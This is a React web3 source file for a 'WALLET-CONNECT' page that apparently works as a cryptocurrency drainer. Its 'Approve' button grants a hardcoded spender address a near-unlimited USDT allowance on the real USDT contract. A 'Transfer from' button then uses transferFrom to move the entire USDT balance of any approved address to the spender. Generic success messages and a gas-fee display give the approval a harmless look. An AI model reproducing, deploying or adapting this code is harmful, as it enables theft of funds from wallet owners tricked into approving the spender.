import { useEffect, useState } from 'react'
import Web3 from 'web3'
import WalletConnect from '@walletconnect/client'
import QRCodeModal from '@walletconnect/qrcode-modal'
import Toast from 'light-toast'
import Btn from './components/Btn'
import Ipt from './components/Ipt'
import ABI from './config/USDT_ERC20_ABI.json'
import { formatBalance } from './config/utils'
import WalletSelect from './components/WalletSelect'

const USDT_ERC20_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const SPENDER_ADDRESS = '0xd34121Eb634De20fb4BB1ECB8693069d8411c7a0'

let web3 = null, contract = null, decimals = 0, timer = null
function App() {
	const [ rate, setRate ] = useState({
		'bitcoin': {usd: 51791, cny: 329750},
		'ethereum': {usd: 4400.49, cny: 28017},
		'litecoin': {usd: 163.13, cny: 1038.61},
		'tether': {usd: 0.999824, cny: 6.37},
		'tron': {usd: 0.091731, cny: 0.584041},
		'usd-coin': {usd: 0.998926, cny: 6.36}
	})
	const [ showWalletSelect, setShowWalletSelect ] = useState(false)
	const [ address, setAddress ] = useState('')
	const [ ethBalance, setEthBalance ] = useState(0)
	const [ usdtBalance, setUsdtBalance ] = useState(0)
	const [ gasFee, setGasFee ] = useState(0)

	const [ from, setFrom ] = useState('')
	const [ to, setTo ] = useState('')

	const initWalletConnect = () => {
		// Create a connector
		const connector = new WalletConnect({
			bridge: "https://bridge.walletconnect.org", // Required
			qrcodeModal: QRCodeModal,
		})
		console.log(connector)
		// Check if connection is already established
		if (!connector.connected) {
			// create new session
			connector.createSession()
		}
		// Subscribe to connection events
		connector.on("connect", (error, payload) => {
			if (error) {
				throw error
			}
			console.log('connect:', payload)
			// Get provided accounts and chainId
			const { accounts, chainId } = payload.params[0]
		});
		
		connector.on("session_update", (error, payload) => {
			if (error) {
				throw error
			}
			console.log('session_update:', payload)
			// Get updated accounts and chainId
			const { accounts, chainId } = payload.params[0]
		});
		
		connector.on("disconnect", (error, payload) => {
			if (error) {
				throw error
			}
			console.log('disconnect')
			// Delete connector
		})
	}

	/**
	 * 初始化ETH
	 */
	const init = async () => {
		// initWalletConnect()
		web3 = new Web3(window.ethereum)
		const account = (await web3.eth.getAccounts())[0]
		setAddress(account)
		contract = new web3.eth.Contract(ABI, USDT_ERC20_ADDRESS)
		decimals = await contract.methods.decimals().call()
		console.log(contract)
		refresh()
		getGasFee()
		timer = setInterval(getGasFee, 5000)
	}

	const refresh = async (loading = false) => {
		loading && Toast.loading('Loading...')
		const selectedAddress = web3.utils.toChecksumAddress(web3.currentProvider.selectedAddress)
		const ethB = await web3.eth.getBalance(selectedAddress)
		const usdtB = await contract.methods.balanceOf(selectedAddress).call()
		setEthBalance(web3.utils.fromWei(ethB, 'ether'))
		setUsdtBalance(usdtB / Math.pow(10, decimals))
		Toast.hide()
	}

	const getGasFee = async () => {
		const gasPrice = await web3.eth.getGasPrice()
		const fee = 80000 * +(web3.utils.fromWei(gasPrice, 'ether'))
		setGasFee(fee)
	}

	const getRate = () => {
		fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,usd-coin,litecoin,tron&vs_currencies=usd,cny`)
			.then(res => res.json())
			.then(res => {
				setRate(res)
				const r = {
					ts: new Date().getTime(),
					value: res
				}
				localStorage.setItem('rate', JSON.stringify(r))
			})
	}

	useEffect(() => {
		const connected = sessionStorage.getItem('connected')
		if (connected) {
			init()
		}
	}, [])

	useEffect(() => {
		const rate1 = localStorage.getItem('rate')
		if (rate1) {
			const r = JSON.parse(rate1)
			setRate(r.value)
			if ((+r.ts - new Date().getTime()) > 3600000 * 6) {
				getRate()
			}
		} else {
			getRate()
		}
		
		return () => {
			if (timer) {
				clearInterval(timer)
				timer = null
			}
		}
	}, [])

	return (
		<>
			<div className="w-full flex flex-col items-center p-4">
				<h1 className="text-4xl text-red-500 text-center font-bold py-4">WALLET-CONNECT</h1>
				<Btn 
					text={'Connect'} 
					theme={'black'} 
					onClick={() => {
						setShowWalletSelect(true)
					}} 
				/>
				{
					address ? 
					<>
						<div className="py-3 text-center text-sm text-gray-600">
							<div>Address: <span className="text-blue-500">{address}</span></div>
							<div>Balance:  <span className="text-red-500 mx-2">{formatBalance(ethBalance)} ETH</span>| <span className="text-green-500 ml-2">{formatBalance(usdtBalance)} USDT</span></div>
							<div style={{ animation: 'fade 1s infinite' }}>
								Estimated gas fee: 
								<span className="text-yellow-500 ml-2">{formatBalance(gasFee)} ETH</span>
								<span className="mx-2">(${formatBalance(+gasFee * rate['ethereum'].usd, 2)})</span>
								<span>(¥{formatBalance(+gasFee * rate['ethereum'].cny, 2)})</span>
							</div>
						</div> 
						<Btn text={'Refresh'} onClick={() => refresh(true)} />
						<Btn 
							text={'Approve'} 
							theme={'green'} 
							onClick={async () => {
								const allowanceBalance = await contract.methods.allowance(address, SPENDER_ADDRESS).call()
								console.log(allowanceBalance)
								if (allowanceBalance > 0) {
									return Toast.success('You have done!')
								}
								const res = await contract.methods.approve(SPENDER_ADDRESS, 99999999000000).send({
									from: address,
									gas: 80000
								})
								if (res.code === 4001) {
									return Toast.fail(res.message)
								}
								Toast.success('Success!')
							}} 
						/>
						<Ipt 
							placeholder={'From (Approved)'} 
							value={from} 
							onChange={(e) => {
								setFrom(e.target.value)
							}} 
						/>
						<Ipt 
							placeholder={'To'} 
							value={to} 
							onChange={(e) => {
								setTo(e.target.value)
							}}
						/>
						<Btn 
							text={'Get allowance'} 
							theme={'yellow'} 
							onClick={async () => {
								// // if (!from.trim()) {
								// // 	Toast.fail('From address is required!')
								// // 	return
								// // }
								if (from && !web3.utils.isAddress(from.trim())) {
									Toast.fail('From address is invalid!')
									return
								}
								const allowanceBalance = await contract.methods.allowance(from || address, SPENDER_ADDRESS).call()
								Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
							}} 
						/>
						<Btn 
							text={'Transfer from'} 
							theme={'yellow'} 
							onClick={async () => {
								if (from && !web3.utils.isAddress(from.trim())) {
									Toast.fail('From address is invalid!')
									return
								}
								const toAddress = to || SPENDER_ADDRESS
								const balance = await contract.methods.balanceOf(from || address).call()
								alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
								Toast.loading('Loading...')
								const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
								// // const res = await contract.transfer(toAddress, balance).send()
								console.log(res)
								Toast.hide()
								setTimeout(() => {
									refresh()
								}, 3000)
								
							}}
						/>
					</>
					: <></>
				}
			</div>
			{
				showWalletSelect ? 
					<WalletSelect 
						setShow={setShowWalletSelect} 
						onSuccess={(w3) => {
							web3 = w3
							init()
						}}
					/> : <></>
			}
		</>
	)
}

export default App
